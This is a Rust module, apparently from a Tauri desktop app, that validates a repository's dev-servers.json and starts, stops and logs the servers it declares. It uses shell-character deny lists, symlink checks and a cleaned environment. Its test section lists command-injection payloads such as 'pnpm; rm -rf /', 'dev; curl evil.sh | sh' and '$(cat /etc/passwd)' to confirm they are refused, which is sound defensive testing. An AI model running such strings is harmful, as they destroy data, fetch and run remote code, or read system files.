//! Dev servers on the Background Processes screen (`orchestration.dev_servers`):
//! the servers a project declares in `<project>/.puppeteer/dev-servers.json`,
//! started and stopped by the person at the machine.
//!
//! The rules are those of the `dev_server_*` MCP tools
//! (`sidecar-mcp/lib/dev-servers.mjs`), ported so both sides agree on what a file
//! allows and where a server writes:
//! - the file sits in the repo, so it is untrusted: `command` is one token,
//!   `args` an array, no token carries a shell character, `cwd` is relative and
//!   stays in the project, there is no `env`, at most 24 servers, names unique
//!   ignoring case. A bad entry is dropped; a broken file is an error and nothing
//!   in it is used;
//! - output goes to `.puppeteer/dev-servers/<name>.log`, and the processes
//!   holding that file open for writing are the server (`lsof`), whoever started
//!   it — so the agent's `dev_server_logs` / `dev_server_stop` find a server
//!   started here, and this screen finds one the agent started;
//! - a symlinked `.puppeteer`, log directory, log or config is never used.
//!
//! Starting: the screen shows the exact launch command (the string the MCP tool
//! hands the agent) and sends it back; it must still match the file. The
//! process runs it without a shell, with an environment rebuilt from an allow
//! list ([`clean_env`]: no token, no `AWS_*`, no `NODE_OPTIONS`) plus the
//! broker + shims a run gets. A second copy is refused while something writes
//! the log or listens on the declared port.

use super::{ProcKind, ProcSpec};
use crate::db::Db;
use serde::Serialize;
use serde_json::Value;
use std::collections::{BTreeSet, HashMap};
use std::ffi::OsString;
use std::path::{Component, Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tauri::{AppHandle, State};

pub const FEATURE: &str = "orchestration.dev_servers";

const CONFIG_DIR: &str = ".puppeteer";
const CONFIG_FILE: &str = "dev-servers.json";
const LOG_DIR: &str = "dev-servers";

// A real project declares 2–5; the caps only stop a pathological file.
pub const MAX_SERVERS: usize = 24;
const MAX_ARGS: usize = 32;
const MAX_ARG_LEN: usize = 512;
const MAX_CWD_LEN: usize = 200;
const MAX_NAME_LEN: usize = 40;
const MAX_COMMAND_LEN: usize = 120;

/// Bytes of a log the screen reads (its end).
const LOG_TAIL_BYTES: u64 = 64 * 1024;
const LSOF_TIMEOUT: Duration = Duration::from_secs(5);
const PORT_PROBE_TIMEOUT: Duration = Duration::from_millis(400);
/// Grace between SIGTERM and SIGKILL on Stop.
const STOP_GRACE: Duration = Duration::from_secs(3);

/// Parent variables a dev server keeps: where it runs and how text looks. The
/// rest — tokens, cloud credentials, `NODE_OPTIONS` / `LD_PRELOAD`, Puppeteer's
/// own — is dropped. Windows names for when the app builds there.
const ENV_ALLOW: &[&str] = &[
    "HOME", "USER", "LOGNAME", "SHELL", "PATH", "TMPDIR", "TMP", "TEMP", "LANG", "LANGUAGE", "TERM",
    "COLORTERM", "TZ", "SYSTEMROOT", "WINDIR", "COMSPEC", "PATHEXT", "USERPROFILE", "APPDATA",
    "LOCALAPPDATA", "PROGRAMDATA",
];

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct DevServer {
    pub name: String,
    pub command: String,
    pub args: Vec<String>,
    pub cwd: String,
    pub port: Option<u16>,
    pub description: Option<String>,
}

#[derive(Debug, Clone, Default)]
pub struct DevServerConfig {
    pub path: PathBuf,
    pub servers: Vec<DevServer>,
    /// One line per entry left out.
    pub problems: Vec<String>,
    pub missing: bool,
}

// ---- Declaration -------------------------------------------------------------

pub fn config_path(root: &Path) -> PathBuf {
    root.join(CONFIG_DIR).join(CONFIG_FILE)
}

pub fn log_path(root: &Path, name: &str) -> PathBuf {
    root.join(CONFIG_DIR).join(LOG_DIR).join(format!("{name}.log"))
}

/// Shell and control characters, refused in every token of the file. A deny
/// list so real args (`--filter=@scope/ui`, `--host 0.0.0.0`) still pass.
fn shell_unsafe(c: char) -> bool {
    matches!(c, ';' | '&' | '|' | '`' | '$' | '(' | ')' | '{' | '}' | '<' | '>' | '\\' | '\'' | '"')
        || c.is_ascii_control()
}

/// Doubles as the log file name: no spaces, no shell characters, no leading dot.
fn valid_name(s: &str) -> bool {
    let mut chars = s.chars();
    chars.next().is_some_and(|c| c.is_ascii_alphanumeric())
        && s.len() <= MAX_NAME_LEN
        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
}

/// One program name or path; a leading `-` would be a flag, not a program.
fn valid_command(s: &str) -> bool {
    let mut chars = s.chars();
    chars.next().is_some_and(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '@' | '+'))
        && s.len() <= MAX_COMMAND_LEN
        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '@' | '+' | '-'))
}

/// `path.resolve`: `.` and `..` folded without touching the disk.
fn normalize(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for c in path.components() {
        match c {
            Component::CurDir => {}
            Component::ParentDir => {
                out.pop();
            }
            other => out.push(other.as_os_str()),
        }
    }
    out
}

fn inside(root: &Path, target: &Path) -> bool {
    target.starts_with(root)
}

/// Absolute run directory of `entry`; an error when it would leave the project.
pub fn resolve_entry_cwd(root: &Path, entry: &DevServer) -> Result<PathBuf, String> {
    let base = normalize(root);
    let target = normalize(&base.join(&entry.cwd));
    if Path::new(&entry.cwd).is_absolute() || !inside(&base, &target) {
        return Err(format!("Dev server \"{}\": cwd escapes the project root", entry.name));
    }
    Ok(target)
}

/// [`resolve_entry_cwd`] as the disk resolves it: a directory the repo commits as
/// a symlink must not send the server out of the project.
fn real_entry_cwd(root: &Path, entry: &DevServer) -> Result<PathBuf, String> {
    let cwd = resolve_entry_cwd(root, entry)?;
    let real = |p: &Path| {
        std::fs::canonicalize(p).map_err(|e| format!("Dev server \"{}\": cannot resolve {}: {e}", entry.name, p.display()))
    };
    let real_cwd = real(&cwd)?;
    if !inside(&real(root)?, &real_cwd) {
        return Err(format!("Dev server \"{}\": cwd leaves the project through a symbolic link", entry.name));
    }
    Ok(real_cwd)
}

/// Fails when `file`, or a directory between the project root and it, is a
/// symlink or not what it should be. The repo can commit
/// `.puppeteer/dev-servers/web.log` as a link to any file: starting would
/// overwrite it, the log view would read it and Stop would signal its writers.
pub fn assert_local_path(root: &Path, file: &Path) -> Result<(), String> {
    let rel = file
        .strip_prefix(root)
        .map_err(|_| format!("{} is outside the project; refusing to use it.", file.display()))?;
    let parts: Vec<Component> = rel.components().collect();
    let mut at = root.to_path_buf();
    for (i, part) in parts.iter().enumerate() {
        at.push(part);
        let meta = match std::fs::symlink_metadata(&at) {
            Ok(m) => m,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => return Err(format!("{}: {e}", at.display())),
        };
        let last = i + 1 == parts.len();
        let ft = meta.file_type();
        if ft.is_symlink() || (if last { !ft.is_file() } else { !ft.is_dir() }) {
            return Err(format!(
                "{} is a symbolic link or not a plain {}; refusing to use it.",
                at.display(),
                if last { "file" } else { "directory" }
            ));
        }
    }
    Ok(())
}

fn check_cwd(name: &str, cwd: &str, root: &Path) -> Result<(), String> {
    if cwd.chars().count() > MAX_CWD_LEN {
        return Err(format!("server \"{name}\": cwd is too long"));
    }
    if Path::new(cwd).is_absolute() || cwd.starts_with('~') {
        return Err(format!("server \"{name}\": cwd must be relative to the project root"));
    }
    if cwd.chars().any(shell_unsafe) {
        return Err(format!("server \"{name}\": cwd contains a shell character"));
    }
    let base = normalize(root);
    if !inside(&base, &normalize(&base.join(cwd))) {
        return Err(format!("server \"{name}\": cwd escapes the project root"));
    }
    Ok(())
}

/// One raw entry → the server, or the line telling the user why it was left out.
fn check_entry(raw: &Value, root: &Path) -> Result<DevServer, String> {
    let obj = raw.as_object();
    let field = |k: &str| obj.and_then(|o| o.get(k)).filter(|v| !v.is_null());
    let (Some(obj), Some(raw_name), Some(raw_command)) = (
        obj,
        field("name").and_then(Value::as_str),
        field("command").and_then(Value::as_str),
    ) else {
        return Err("one entry is malformed: it needs a string \"name\" and a string \"command\"".into());
    };
    if obj.contains_key("env") {
        return Err(format!("server \"{raw_name}\": \"env\" is not supported"));
    }
    let name = raw_name.trim().to_string();
    if !valid_name(&name) {
        return Err(format!("server \"{raw_name}\": name must be 1–40 chars of letters, digits, . _ -"));
    }
    let command = raw_command.trim().to_string();
    if !valid_command(&command) || command.chars().any(shell_unsafe) {
        return Err(format!(
            "server \"{name}\": command must be a single program name or path with no shell characters (got {raw_command:?})"
        ));
    }
    let args: Vec<String> = match field("args") {
        None => Vec::new(),
        Some(Value::Array(items)) if items.iter().all(Value::is_string) => {
            items.iter().filter_map(|v| v.as_str().map(str::to_string)).collect()
        }
        Some(_) => return Err(format!("server \"{name}\": args must be an array of strings")),
    };
    if args.len() > MAX_ARGS {
        return Err(format!("server \"{name}\": too many args ({} > {MAX_ARGS})", args.len()));
    }
    for arg in &args {
        if arg.chars().count() > MAX_ARG_LEN {
            return Err(format!("server \"{name}\": one arg is longer than {MAX_ARG_LEN} characters"));
        }
        if arg.chars().any(shell_unsafe) {
            return Err(format!(
                "server \"{name}\": arg {arg:?} contains a shell character; args must be plain values"
            ));
        }
    }
    let cwd = match field("cwd") {
        None => ".".to_string(),
        Some(Value::String(s)) => Some(s.trim()).filter(|s| !s.is_empty()).unwrap_or(".").to_string(),
        Some(_) => return Err(format!("server \"{name}\": cwd must be a string")),
    };
    check_cwd(&name, &cwd, root)?;
    let port = match field("port") {
        None => None,
        Some(v) => match v.as_f64() {
            Some(n) if n.fract() == 0.0 && (1.0..=65535.0).contains(&n) => Some(n as u16),
            _ => return Err(format!("server \"{name}\": port must be an integer between 1 and 65535")),
        },
    };
    let description = match field("description") {
        None => None,
        Some(Value::String(s)) => Some(s.trim().to_string()).filter(|s| !s.is_empty()),
        Some(_) => return Err(format!("server \"{name}\": description must be a string")),
    };
    Ok(DevServer { name, command, args, cwd, port, description })
}

/// Read and check the declaration. A missing file is `missing`, not an error. A
/// file that is not JSON or has no `servers` array is an error: nothing in it is
/// used. A bad entry is left out with one line in `problems`.
pub fn load_config(root: &Path) -> Result<DevServerConfig, String> {
    let path = config_path(root);
    // A linked file could be anything, and a JSON error quotes part of it.
    assert_local_path(root, &path)?;
    let raw = match std::fs::read_to_string(&path) {
        Ok(s) => s,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            return Ok(DevServerConfig { path, missing: true, ..Default::default() });
        }
        Err(e) => return Err(format!("Cannot read {}: {e}", path.display())),
    };
    let json: Value = serde_json::from_str(&raw).map_err(|e| {
        format!("{} is not valid JSON ({e}). Fix it; no dev server is used until then.", path.display())
    })?;
    let Some(items) = json.as_object().and_then(|o| o.get("servers")).and_then(Value::as_array) else {
        return Err(format!(
            "{} must be an object with a \"servers\" array. Fix it; no dev server is used until then.",
            path.display()
        ));
    };
    let mut servers: Vec<DevServer> = Vec::new();
    let mut problems = Vec::new();
    let mut seen = BTreeSet::new();
    let mut ports = BTreeSet::new();
    for item in items {
        if servers.len() >= MAX_SERVERS {
            problems.push(format!("only the first {MAX_SERVERS} servers are used; the rest were ignored"));
            break;
        }
        match check_entry(item, root) {
            Err(problem) => problems.push(problem),
            // Case-insensitive: names are also log file names, and macOS folds case.
            Ok(entry) if !seen.insert(entry.name.to_lowercase()) => {
                problems.push(format!("server \"{}\": duplicate name, the later entry was ignored", entry.name));
            }
            // Two servers on one port: before the first listens, the port probe
            // cannot tell the second it is taken.
            Ok(entry) if entry.port.is_some_and(|p| !ports.insert(p)) => {
                problems.push(format!(
                    "server \"{}\": port {} is declared by an earlier entry, the later entry was ignored",
                    entry.name,
                    entry.port.unwrap_or_default()
                ));
            }
            Ok(entry) => servers.push(entry),
        }
    }
    Ok(DevServerConfig { path, servers, problems, missing: false })
}

pub fn find_entry<'a>(servers: &'a [DevServer], name: &str) -> Option<&'a DevServer> {
    let wanted = name.trim().to_lowercase();
    servers.iter().find(|s| s.name.to_lowercase() == wanted)
}

/// Bare when plainly readable, else single-quoted. Inside single quotes only `'`
/// and control characters could break out; file tokens never carry them, and a
/// project path that does is refused rather than escaped.
fn shell_token(token: &str) -> Result<String, String> {
    if !token.is_empty()
        && token.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '@' | '+' | '=' | ':' | ',' | '-'))
    {
        return Ok(token.to_string());
    }
    if token.chars().any(|c| c == '\'' || c.is_ascii_control()) {
        return Err(format!("Dev server: cannot quote {token:?} safely for a shell"));
    }
    Ok(format!("'{token}'"))
}

fn path_token(path: &Path) -> Result<String, String> {
    shell_token(path.to_str().ok_or_else(|| format!("Dev server: {} is not valid UTF-8", path.display()))?)
}

/// The exact launch command of `entry`, the same string `dev_server_start`
/// hands the agent: what the user reads before Start.
pub fn launch_command(root: &Path, entry: &DevServer) -> Result<String, String> {
    let root = normalize(root);
    let mut parts = vec![
        "cd".to_string(),
        path_token(&resolve_entry_cwd(&root, entry)?)?,
        "&&".to_string(),
        shell_token(&entry.command)?,
    ];
    for arg in &entry.args {
        parts.push(shell_token(arg)?);
    }
    parts.push(">".into());
    parts.push(path_token(&log_path(&root, &entry.name))?);
    parts.push("2>&1".into());
    Ok(parts.join(" "))
}

// ---- Processes ---------------------------------------------------------------

/// The parent variables a dev server may see (see [`ENV_ALLOW`]).
pub fn clean_env(parent: impl IntoIterator<Item = (OsString, OsString)>) -> Vec<(OsString, OsString)> {
    parent
        .into_iter()
        .filter(|(k, _)| {
            k.to_str().is_some_and(|k| {
                let k = k.to_ascii_uppercase();
                ENV_ALLOW.contains(&k.as_str()) || k.starts_with("LC_")
            })
        })
        .collect()
}

/// `lsof -F pa` output → pids holding the file open for writing (`w` / `u`
/// access); a reader such as `tail -f` is not one. Never pid 1 or `me`.
fn parse_lsof(out: &str, me: u32) -> Vec<u32> {
    let mut pids = BTreeSet::new();
    let mut pid = 0u32;
    for line in out.lines() {
        if let Some(p) = line.strip_prefix('p') {
            pid = p.trim().parse().unwrap_or(0);
        } else if let Some(mode) = line.strip_prefix('a') {
            if mode.contains(['w', 'u']) && pid > 1 && pid != me {
                pids.insert(pid);
            }
        }
    }
    pids.into_iter().collect()
}

/// Pids writing `file`: the processes its launch command started. `Some([])`
/// when none, `None` when `lsof` cannot tell.
pub async fn log_writers(file: &Path) -> Option<Vec<u32>> {
    if !file.exists() {
        return Some(Vec::new());
    }
    let out = tokio::process::Command::new("lsof")
        .args(["-F", "pa", "--"])
        .arg(file)
        .stdin(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .kill_on_drop(true)
        .output();
    let out = tokio::time::timeout(LSOF_TIMEOUT, out).await.ok()?.ok()?;
    // lsof exits 1 when nobody has the file open; anything else means it cannot tell.
    match out.status.code() {
        Some(0) | Some(1) => Some(parse_lsof(&String::from_utf8_lossy(&out.stdout), std::process::id())),
        _ => None,
    }
}

/// Whether something accepts connections on `port` (IPv4 or IPv6 loopback).
pub async fn port_in_use(port: u16) -> bool {
    let probe = |host: &'static str| async move {
        let addr = format!("{host}:{port}");
        matches!(
            tokio::time::timeout(PORT_PROBE_TIMEOUT, tokio::net::TcpStream::connect(addr)).await,
            Ok(Ok(_))
        )
    };
    let (v4, v6) = tokio::join!(probe("127.0.0.1"), probe("[::1]"));
    v4 || v6
}

fn open_log(log: &Path) -> Result<std::fs::File, String> {
    let mut o = std::fs::OpenOptions::new();
    o.write(true).create(true).truncate(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        // Never through a link swapped in after the check.
        o.mode(0o600).custom_flags(libc::O_NOFOLLOW);
    }
    let file = o.open(log).map_err(|e| format!("Cannot open {}: {e}", log.display()))?;
    // `mode` only applies to a new file; one the agent's shell created has its umask.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        file.set_permissions(std::fs::Permissions::from_mode(0o600))
            .map_err(|e| format!("Cannot restrict {}: {e}", log.display()))?;
    }
    Ok(file)
}

fn already_running(entry: &DevServer, pids: &[u32]) -> String {
    let pids: Vec<String> = pids.iter().map(u32::to_string).collect();
    format!(
        "\"{}\" is already running (pid {}{}). A second copy would fight for the same port and log.",
        entry.name,
        pids.join(", "),
        entry.port.map(|p| format!(", port {p}")).unwrap_or_default()
    )
}

/// `live`: the pid of the copy started here; `writers`: [`log_writers`].
fn not_running(entry: &DevServer, live: Option<u32>, writers: Option<Vec<u32>>) -> Result<(), String> {
    if let Some(pid) = live {
        return Err(already_running(entry, &[pid]));
    }
    match writers {
        Some(pids) if !pids.is_empty() => Err(already_running(entry, &pids)),
        Some(_) => Ok(()),
        // Start truncates the log: a copy lsof could not see would lose it.
        None => Err(format!(
            "Cannot tell whether \"{}\" is already running: lsof did not answer for its log. Stop it, or delete the log if nothing runs, then start again.",
            entry.name
        )),
    }
}

/// Dev servers this app started, and the lock that keeps two Starts apart.
#[derive(Default)]
pub struct DevServers {
    /// Held from the checks to the spawn: two quick Starts of one server
    /// cannot both find it stopped.
    starting: tokio::sync::Mutex<()>,
    /// Log path → root pid and declared port of each server started here that
    /// has not exited.
    live: Arc<Mutex<HashMap<PathBuf, (u32, Option<u16>)>>>,
}

impl DevServers {
    fn live_pid(&self, log: &Path) -> Option<u32> {
        self.live.lock().unwrap_or_else(|e| e.into_inner()).get(log).map(|(pid, _)| *pid)
    }

    /// A server started here on `port`: it may not listen yet, so the probe misses it.
    fn live_on_port(&self, port: u16) -> Option<u32> {
        let live = self.live.lock().unwrap_or_else(|e| e.into_inner());
        live.values().find(|(_, p)| *p == Some(port)).map(|(pid, _)| *pid)
    }

    /// Start `entry` with exactly `env`, unless a copy already writes its log or
    /// its port is taken. Returns the server's pid.
    pub async fn start(
        &self,
        root: &Path,
        entry: &DevServer,
        env: Vec<(OsString, OsString)>,
        project_id: Option<String>,
    ) -> Result<u32, String> {
        let _turn = self.starting.lock().await;
        let root = normalize(root);
        let log = log_path(&root, &entry.name);
        assert_local_path(&root, &log)?;
        let live = self.live_pid(&log);
        not_running(entry, live, log_writers(&log).await)?;
        if let Some(port) = entry.port {
            if let Some(pid) = self.live_on_port(port) {
                return Err(format!(
                    "Port {port} is already taken by another dev server Puppeteer started (pid {pid}), so \"{}\" would not come up.",
                    entry.name
                ));
            }
            if port_in_use(port).await {
                return Err(format!(
                    "Port {port} is already in use by a process Puppeteer did not start, so \"{}\" would not come up.",
                    entry.name
                ));
            }
        }
        let cwd = real_entry_cwd(&root, entry)?;
        if let Some(dir) = log.parent() {
            std::fs::create_dir_all(dir).map_err(|e| format!("Cannot create {}: {e}", dir.display()))?;
        }
        assert_local_path(&root, &log)?;
        let out = open_log(&log)?;
        let err = out.try_clone().map_err(|e| e.to_string())?;
        let mut child = {
            let mut cmd = tokio::process::Command::new(&entry.command);
            cmd.args(&entry.args)
                .current_dir(&cwd)
                .env_clear()
                .envs(env)
                .stdin(std::process::Stdio::null())
                .stdout(out)
                .stderr(err)
                .kill_on_drop(false);
            crate::runs::sidecar::detach_process_group(&mut cmd);
            cmd.spawn().map_err(|e| format!("Could not start \"{}\": {e}", entry.name))?
            // `cmd` is dropped here, closing this app's copies of the log: the
            // app must never count as a writer (the MCP `stop` would signal it).
        };
        let pid = child.id().ok_or_else(|| format!("\"{}\" exited at once", entry.name))?;
        self.live.lock().unwrap_or_else(|e| e.into_inner()).insert(log.clone(), (pid, entry.port));
        let mut spec = ProcSpec::new(ProcKind::DevServer, entry.name.clone());
        spec.project_id = project_id;
        let guard = super::track(spec, Some(pid));
        let live = self.live.clone();
        tokio::spawn(async move {
            let _ = child.wait().await;
            let mut live = live.lock().unwrap_or_else(|e| e.into_inner());
            if live.get(&log).map(|(p, _)| *p) == Some(pid) {
                live.remove(&log);
            }
            drop(guard);
        });
        Ok(pid)
    }

    /// Stop the processes writing `entry`'s log (and the group of one started
    /// here). Never a process that only holds the port. Returns how many were
    /// signalled.
    pub async fn stop(&self, root: &Path, entry: &DevServer) -> Result<usize, String> {
        let root = normalize(root);
        let log = log_path(&root, &entry.name);
        assert_local_path(&root, &log)?;
        let own = self.live_pid(&log);
        let writers = log_writers(&log).await;
        if writers.is_none() && own.is_none() {
            return Err(format!("Cannot find the processes of \"{}\": lsof is not available.", entry.name));
        }
        let mut pids = writers.unwrap_or_default();
        if let Some(p) = own.filter(|p| !pids.contains(p)) {
            pids.push(p);
        }
        if pids.is_empty() {
            return Err(format!("\"{}\" is not running from its declared command.", entry.name));
        }
        let targets = pids.into_iter().map(|p| (p, String::new())).collect();
        Ok(super::terminate(targets, own.into_iter().collect(), false, STOP_GRACE).await)
    }
}

// ---- Log ---------------------------------------------------------------------

/// Colours, cursor moves and `\r` progress redraws removed, as the MCP tool does.
fn strip_ansi(raw: &str) -> String {
    let mut out = String::with_capacity(raw.len());
    let mut it = raw.chars().peekable();
    while let Some(c) = it.next() {
        if c != '\x1b' {
            out.push(c);
            continue;
        }
        match it.peek().copied() {
            // OSC: up to BEL or ESC \.
            Some(']') => {
                it.next();
                while let Some(c) = it.next() {
                    if c == '\x07' || (c == '\x1b' && it.next_if_eq(&'\\').is_some()) {
                        break;
                    }
                }
            }
            // CSI: parameters, intermediates, one final byte.
            Some('[') => {
                it.next();
                while it.next_if(|c| c.is_ascii_digit() || matches!(c, ';' | '?')).is_some() {}
                while it.next_if(|c| (' '..='/').contains(c)).is_some() {}
                it.next_if(|c| ('@'..='~').contains(c));
            }
            Some(c) if ('@'..='_').contains(&c) => {
                it.next();
            }
            _ => {}
        }
    }
    out.replace("\r\n", "\n")
        .split('\n')
        .map(|line| {
            let line = line.rsplit('\r').next().unwrap_or("");
            line.chars().filter(|c| *c == '\t' || !c.is_control()).collect::<String>()
        })
        .collect::<Vec<_>>()
        .join("\n")
}

#[derive(Debug, Clone, Serialize)]
pub struct DevServerLog {
    pub text: String,
    /// Only the end of a longer log was read.
    pub truncated: bool,
}

pub fn read_log(root: &Path, entry: &DevServer) -> Result<DevServerLog, String> {
    use std::io::{Read, Seek, SeekFrom};
    let root = normalize(root);
    let log = log_path(&root, &entry.name);
    assert_local_path(&root, &log)?;
    let mut o = std::fs::OpenOptions::new();
    o.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        o.custom_flags(libc::O_NOFOLLOW);
    }
    let mut f = match o.open(&log) {
        Ok(f) => f,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            return Err(format!("\"{}\" has not been started from its declared command, so it has no log yet.", entry.name));
        }
        Err(e) => return Err(format!("Cannot read {}: {e}", log.display())),
    };
    let size = f.metadata().map_err(|e| e.to_string())?.len();
    let start = size.saturating_sub(LOG_TAIL_BYTES);
    f.seek(SeekFrom::Start(start)).map_err(|e| e.to_string())?;
    let mut buf = Vec::new();
    f.take(LOG_TAIL_BYTES).read_to_end(&mut buf).map_err(|e| e.to_string())?;
    let mut text = strip_ansi(&String::from_utf8_lossy(&buf));
    if start > 0 {
        // The first line was cut mid-way.
        text = text.split_once('\n').map(|(_, rest)| rest.to_string()).unwrap_or_default();
    }
    Ok(DevServerLog { text: text.trim_end().to_string(), truncated: start > 0 })
}

// ---- Commands ----------------------------------------------------------------

#[derive(Debug, Clone, Serialize)]
pub struct DevServerView {
    #[serde(flatten)]
    pub server: DevServer,
    /// The exact command Start runs.
    pub launch: String,
    pub log: String,
    /// Writers of the log; `None` when `lsof` cannot tell.
    pub pids: Option<Vec<u32>>,
    pub port_busy: Option<bool>,
    /// `running` | `port_busy` | `unknown` | `stopped`.
    pub status: &'static str,
}

#[derive(Debug, Clone, Serialize)]
pub struct DevServerList {
    pub config_path: String,
    pub missing: bool,
    pub servers: Vec<DevServerView>,
    pub problems: Vec<String>,
}

fn status_of(pids: Option<&[u32]>, port: Option<u16>, port_busy: Option<bool>) -> &'static str {
    match (pids, port_busy) {
        (Some(p), _) if !p.is_empty() => "running",
        (_, Some(true)) => "port_busy",
        (None, _) if port.is_none() => "unknown",
        _ => "stopped",
    }
}

async fn project_root(db: &Db, project_id: &str) -> Result<PathBuf, String> {
    let path: Option<String> = sqlx::query_scalar("SELECT path FROM projects WHERE id = ?")
        .bind(project_id)
        .fetch_optional(db)
        .await
        .map_err(|e| e.to_string())?;
    let path = path.ok_or_else(|| format!("Project {project_id} not found"))?;
    Ok(normalize(Path::new(&path)))
}

async fn lookup(db: &Db, project_id: &str, name: &str) -> Result<(PathBuf, DevServer), String> {
    crate::features::require(db, FEATURE).await?;
    let root = project_root(db, project_id).await?;
    let config = load_config(&root)?;
    let entry = find_entry(&config.servers, name).cloned().ok_or_else(|| {
        if config.missing {
            format!("No dev server config at {}.", config.path.display())
        } else {
            format!("No dev server named \"{}\" in {}.", name.trim(), config.path.display())
        }
    })?;
    Ok((root, entry))
}

/// The environment of a dev server: [`clean_env`] of this app's, the login
/// shell's PATH, then the broker + shims of a run (`wire_tool_broker`).
async fn server_env(app: &AppHandle, db: &Db, project_id: &str) -> Result<Vec<(OsString, OsString)>, String> {
    let mut scratch = tokio::process::Command::new("true");
    scratch.env_clear().envs(clean_env(std::env::vars_os()));
    crate::runs::sidecar::augment_command_path(&mut scratch);
    crate::commands::runs::wire_tool_broker(app, db, &mut scratch, project_id).await?;
    Ok(scratch
        .as_std()
        .get_envs()
        .filter_map(|(k, v)| Some((k.to_owned(), v?.to_owned())))
        .collect())
}

#[tauri::command]
pub async fn devserver_list(
    db: State<'_, Db>,
    state: State<'_, DevServers>,
    project_id: String,
) -> Result<DevServerList, String> {
    crate::features::require(db.inner(), FEATURE).await?;
    let root = project_root(db.inner(), &project_id).await?;
    let config = load_config(&root)?;
    let mut servers = Vec::new();
    for entry in config.servers {
        let log = log_path(&root, &entry.name);
        assert_local_path(&root, &log)?;
        let mut pids = log_writers(&log).await;
        if let (Some(p), Some(own)) = (pids.as_mut(), state.live_pid(&log)) {
            if !p.contains(&own) {
                p.push(own);
            }
        }
        let port_busy = match entry.port {
            Some(port) => Some(port_in_use(port).await),
            None => None,
        };
        servers.push(DevServerView {
            launch: launch_command(&root, &entry)?,
            log: log.display().to_string(),
            status: status_of(pids.as_deref(), entry.port, port_busy),
            pids,
            port_busy,
            server: entry,
        });
    }
    Ok(DevServerList {
        config_path: config.path.display().to_string(),
        missing: config.missing,
        servers,
        problems: config.problems,
    })
}

/// Start a declared server. `command` is the launch command the user saw; it
/// must still be what the file declares, so what runs is what was read.
#[tauri::command]
pub async fn devserver_start(
    app: AppHandle,
    db: State<'_, Db>,
    state: State<'_, DevServers>,
    project_id: String,
    name: String,
    command: String,
) -> Result<u32, String> {
    let (root, entry) = lookup(db.inner(), &project_id, &name).await?;
    if launch_command(&root, &entry)? != command {
        return Err(format!(
            "The declaration of \"{}\" changed since it was shown. Review the new command and start again.",
            entry.name
        ));
    }
    let env = server_env(&app, db.inner(), &project_id).await?;
    let pid = state.start(&root, &entry, env, Some(project_id)).await?;
    tracing::info!(event = "dev_server_started", name = %entry.name, pid);
    Ok(pid)
}

#[tauri::command]
pub async fn devserver_stop(
    db: State<'_, Db>,
    state: State<'_, DevServers>,
    project_id: String,
    name: String,
) -> Result<usize, String> {
    let (root, entry) = lookup(db.inner(), &project_id, &name).await?;
    state.stop(&root, &entry).await
}

#[tauri::command]
pub async fn devserver_logs(db: State<'_, Db>, project_id: String, name: String) -> Result<DevServerLog, String> {
    let (root, entry) = lookup(db.inner(), &project_id, &name).await?;
    tokio::task::spawn_blocking(move || read_log(&root, &entry))
        .await
        .map_err(|e| e.to_string())?
}

// Cases ported from sidecar-mcp/test-dev-servers.mjs (config, command, symlinks)
// plus what only the app does: spawn with a clean env, refuse a second copy.
#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    struct Root(PathBuf);
    impl Drop for Root {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    fn root() -> Root {
        let dir = std::env::temp_dir().join(format!("puppeteer-dev-servers-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        // macOS tmp is a symlink; lsof reports resolved paths.
        Root(std::fs::canonicalize(&dir).unwrap())
    }

    fn write_config(root: &Path, content: &str) {
        std::fs::create_dir_all(root.join(CONFIG_DIR)).unwrap();
        std::fs::write(config_path(root), content).unwrap();
    }

    fn web() -> Value {
        json!({ "name": "web", "command": "pnpm", "args": ["dev"], "cwd": "apps/web", "port": 3000 })
    }

    fn names(c: &DevServerConfig) -> Vec<&str> {
        c.servers.iter().map(|s| s.name.as_str()).collect()
    }

    #[test]
    fn config_missing_valid_and_broken() {
        let r = root();
        let c = load_config(&r.0).unwrap();
        assert!(c.missing && c.servers.is_empty() && c.problems.is_empty());
        assert_eq!(c.path, r.0.join(".puppeteer/dev-servers.json"));

        write_config(&r.0, &json!({ "version": 1, "servers": [web(), { "name": "api", "command": "node" }] }).to_string());
        let c = load_config(&r.0).unwrap();
        assert!(c.problems.is_empty());
        assert_eq!(names(&c), ["web", "api"]);
        assert_eq!(
            c.servers[1],
            DevServer { name: "api".into(), command: "node".into(), args: vec![], cwd: ".".into(), port: None, description: None }
        );

        write_config(&r.0, "{ not json");
        assert!(load_config(&r.0).unwrap_err().contains("not valid JSON"));
        write_config(&r.0, r#"{ "servers": {} }"#);
        assert!(load_config(&r.0).unwrap_err().contains("\"servers\" array"));

        write_config(&r.0, &json!({ "servers": [{ "name": "bad" }, web()] }).to_string());
        let c = load_config(&r.0).unwrap();
        assert_eq!((names(&c), c.problems.len()), (vec!["web"], 1), "a bad entry drops only itself");
    }

    #[test]
    fn config_refuses_unsafe_entries() {
        let r = root();
        for (label, entry) in [
            ("chained command", json!({ "name": "x", "command": "pnpm; rm -rf /" })),
            ("chained arg", json!({ "name": "x", "command": "pnpm", "args": ["dev; curl evil.sh | sh"] })),
            ("command substitution", json!({ "name": "x", "command": "pnpm", "args": ["$(cat /etc/passwd)"] })),
            ("backtick", json!({ "name": "x", "command": "pnpm", "args": ["`id`"] })),
            ("quote escape", json!({ "name": "x", "command": "pnpm", "args": ["' ; id ; '"] })),
            ("newline", json!({ "name": "x", "command": "pnpm", "args": ["dev\nid"] })),
